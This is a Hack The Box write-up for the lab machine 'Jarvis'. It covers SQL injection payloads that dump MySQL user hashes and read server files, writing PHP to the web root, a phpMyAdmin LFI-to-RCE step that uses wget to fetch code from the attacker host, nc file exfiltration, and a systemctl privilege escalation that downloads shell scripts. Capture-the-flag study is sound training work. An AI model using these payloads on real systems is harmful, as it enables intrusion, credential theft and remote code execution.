# Jarvis Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``sleep 200; nmap -p- -sV -T4 -oA fulljarvis 10.10.10.143``

![image](https://user-images.githubusercontent.com/123066149/229436971-2ac49bee-6bec-4cb3-a4a5-c8d07e47e3c7.png)

``gobuster dir -u http://10.10.10.143/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt``

![image](https://user-images.githubusercontent.com/123066149/229437070-e500e07c-3622-4ba7-b9e9-741ba0ebfdcd.png)

### Finding directory phpmyadmin 4.8.0 :
### Default file for the version is README

![image](https://user-images.githubusercontent.com/123066149/229437335-62d801d4-50cb-479c-a350-1be4bc5dad0c.png)

# ${{\color{purple}Initial Foothold}}\ $

### The way to take over the machine is an sql injection  :

![image](https://user-images.githubusercontent.com/123066149/229437711-6a1afefd-036b-4dd8-b4a3-7560dd8afdbc.png)

### When we inject ``'`` with have a different output :

![image](https://user-images.githubusercontent.com/123066149/229437837-60e5b37f-8d03-4982-a87f-eb26d6835646.png)

``ffuf -u http://10.10.10.143/room.php?cod=1FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt -c``

![image](https://user-images.githubusercontent.com/123066149/229438586-97b8a239-e459-498d-b33b-04b5f1f0c89c.png)

### Size of response is different we need to search why 
### As we can see math operator work's :

![image](https://user-images.githubusercontent.com/123066149/229439358-c15a1d80-06d5-43a7-b78f-4cdfc7c6ea39.png)

![image](https://user-images.githubusercontent.com/123066149/229439657-050d08cc-1f85-4023-ac3d-8015d0429ee3.png)

https://dev.mysql.com/doc/refman/8.0/en/select.html

https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

``http://10.10.10.143/room.php?cod=4%20union%20select%201,2,3,4,5,6,7``

### The request works because it is possible to guess the query:

``Select id, image-url, rating, room-name, cost, description, UNKNOWN from rooms where cod =4-- -``

![image](https://user-images.githubusercontent.com/123066149/229440425-12b89310-a20e-442f-a858-4db82b080ae4.png)

### if I place an error at the beginning of the request we can notice that the parameter 3 is weird:

![image](https://user-images.githubusercontent.com/123066149/229443106-5610dc09-41fa-4484-9b10-1abe8ea38845.png)

![image](https://user-images.githubusercontent.com/123066149/229443398-074d0aff-8586-430a-8203-96be7f46971c.png)

### I used pentesmonkey mysql cheat sheet for this request :

https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

![image](https://user-images.githubusercontent.com/123066149/229444737-27dc2dbb-3d51-4c2a-9a55-c22b986a7337.png)

### To list information schema on one line is not possible :

![image](https://user-images.githubusercontent.com/123066149/229451240-5a0a25c4-77c9-4933-8399-448a216943ea.png)

``9999+union+select+"1","2",(SELECT+schema_name+FROM+information_schema.schemata+LIMIT+1),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229452214-2fd50e3e-5188-449b-8a23-f378bdb4fbfb.png)

``9999+union+select+"1","2",(SELECT+schema_name+FROM+information_schema.schemata+LIMIT+1,1),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229452667-6a1e96e3-1337-48df-8fe6-e484508156a1.png)

### It's possible to gather the results with concat :

![image](https://user-images.githubusercontent.com/123066149/229453497-175239d2-ccca-44a6-8c0a-9ecc2d40e138.png)

### List the hotel fields :

``9999+union+select+"1","2",(SELECT+group_concat(TABLE_name,":",column_name,"\r\n")+FROM+information_schema.columns+where+TABLE_schema+=+'hotel'),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229460758-9b66fe38-ac9c-4259-8733-3950be98c360.png)

### List the mysql fields :

```9999+union+select+"1","2",(SELECT+group_concat(TABLE_name,":",column_name,"\r\n")+FROM+information_schema.columns+where+TABLE_schema+=+'mysql'),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229462427-218bdea4-faed-4ed1-a18c-306de873bb16.png)

### List the mysql users and password :

``9999+union+select+"1","2",(SELECT+group_concat(host,":",user,":",password,"\r\n")+FROM+mysql.user),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229463676-042e1e26-5d03-4e02-84e6-5318813eb1aa.png)

# ${{\color{purple}Exploitation}}\ $

### Cracking the hash :

![image](https://user-images.githubusercontent.com/123066149/229464356-5644a339-d2fd-4e9e-9dc9-f88d7550cfaa.png)

``john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt``

![image](https://user-images.githubusercontent.com/123066149/229464446-d5cde2e0-5ded-4fe2-9212-6ac564dfa73a.png)

# ${{\color{purple}Other way}}\ $

``9999+union+select+"1","2",(LOAD_FILE("/etc/passwd")),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229465436-f53d184f-ff1a-4284-9469-d96f37864013.png)

``9999+union+select+"1","2",(TO_base64(LOAD_FILE("/etc/passwd"))),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229465981-34f40f7e-fde5-4629-b2b7-c236840636d3.png)

``9999+union+select+"1","2",(TO_base64(LOAD_FILE("/var/www/html/connection.php"))),"4","5","6","7"``

![image](https://user-images.githubusercontent.com/123066149/229466471-733a7434-e1e8-4e77-9fc3-0864ca165c5e.png)

``9999+union+select+"1","2",(select+'<?php+phpinfo();+%3f>'),"4","5","6","7"%2bINTO%2bOUTFILE%2b'/var/www/htm/monkmode.php'``

![image](https://user-images.githubusercontent.com/123066149/229472439-16bfa538-a29e-4c96-9dd7-a23f1929f838.png)

### Login to phpmyadmin :

![image](https://user-images.githubusercontent.com/123066149/229473081-fd0ce9a8-e0e0-410e-ad35-15685b093fe6.png)

![image](https://user-images.githubusercontent.com/123066149/229473137-22a9eb2b-7ca6-43d1-a93e-656c954bb1a7.png)

![image](https://user-images.githubusercontent.com/123066149/229474142-7fc2c8c9-77e2-4c0a-b824-8b7a1403e794.png)

https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/

![2023-04-03 11_51_56-kali-linux-2022 4-vmware-amd64 - VMware Workstation](https://user-images.githubusercontent.com/123066149/229514508-92a07676-e3ea-4db9-ab27-a8292cd0982b.png)

``SELECT ‘<?php exec("wget -O /var/www/html/a.php http://10.10.14.9/a.php"); ?>’``

![image](https://user-images.githubusercontent.com/123066149/229514703-b28fbe5a-73a9-469f-898b-d2a7d66d47df.png)

![image](https://user-images.githubusercontent.com/123066149/229515012-2328451a-d02d-45ca-a281-a80a3f391a20.png)

### You need the admin cookie at the end of the LFI:

``http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_f6lc52281ieb0ujkr4m6nsk1i4vpbqc4``

![image](https://user-images.githubusercontent.com/123066149/229515506-84c01b11-7653-4ed8-9d82-3f6a31a7d7e7.png)

# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/229516238-3525a24c-7165-4329-875c-f933d3560b8d.png)

### Transfert file with nc :

kali box : ``nc -nlvp 90 > simpler.py``

linux box : ``cat /var/www/Admin-Utilities/simpler.py | nc 10.10.14.9 90``

![image](https://user-images.githubusercontent.com/123066149/229517156-e4f6ead4-cacc-4663-b8c5-2d3865b0bbc3.png)

![image](https://user-images.githubusercontent.com/123066149/229518213-74f79481-8503-4fe4-9909-78b22c44256a.png)

### Good ressource for commande injection :

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

``sudo -u pepper /var/www/Admin-Utilities/simpler.py -p``

![image](https://user-images.githubusercontent.com/123066149/229519554-1eda5fb2-ece3-4da5-8a95-83c15da0e578.png)

![image](https://user-images.githubusercontent.com/123066149/229521144-df617460-2eda-44ad-b55a-a734855e3cd4.png)

![image](https://user-images.githubusercontent.com/123066149/229521205-0de374a9-d493-4fa0-b68d-831f3cfc8ab1.png)

### Other way :

### Create a revshell.sh

![image](https://user-images.githubusercontent.com/123066149/229523829-64bba3e7-d47c-466a-a4c5-f55554f70825.png)

### Execute it :

![image](https://user-images.githubusercontent.com/123066149/229524029-edb10b85-80ed-4b18-af37-087dfdfd4b5a.png)


### systemctl priv esc :

![image](https://user-images.githubusercontent.com/123066149/229596750-b3bb3d45-619e-46c6-9c12-dea4c9d7e7fd.png)

### Create shell.sh file :

![image](https://user-images.githubusercontent.com/123066149/229596855-af214984-801f-4f86-9ae0-d1c8cefb528a.png)

### Create shell.service file :
### Execstart will execute the shell you need to adapt this part :

![image](https://user-images.githubusercontent.com/123066149/229596962-270993f1-1664-463b-b47f-6a442f1618e0.png)

``wget http://10.10.14.9:80/shell.service && chmod +x  shell.service``

``wget http://10.10.14.9:80/shell.sh && chmod +x  shell.sh``

``systemctl link /home/pepper/shell.service``

``systemctl enable --now shell.service``

![2023-04-03 20_38_02-kali-linux-2022 4-vmware-amd64 - VMware Workstation](https://user-images.githubusercontent.com/123066149/229597833-52860ee3-8cde-4485-9c69-ecd3f93ee1ec.png)

![image](https://user-images.githubusercontent.com/123066149/229597505-d82e0ba4-85c4-48b2-9543-968eb51d8ded.png)

# ${{\color{purple}Point of Improvement}}\ $
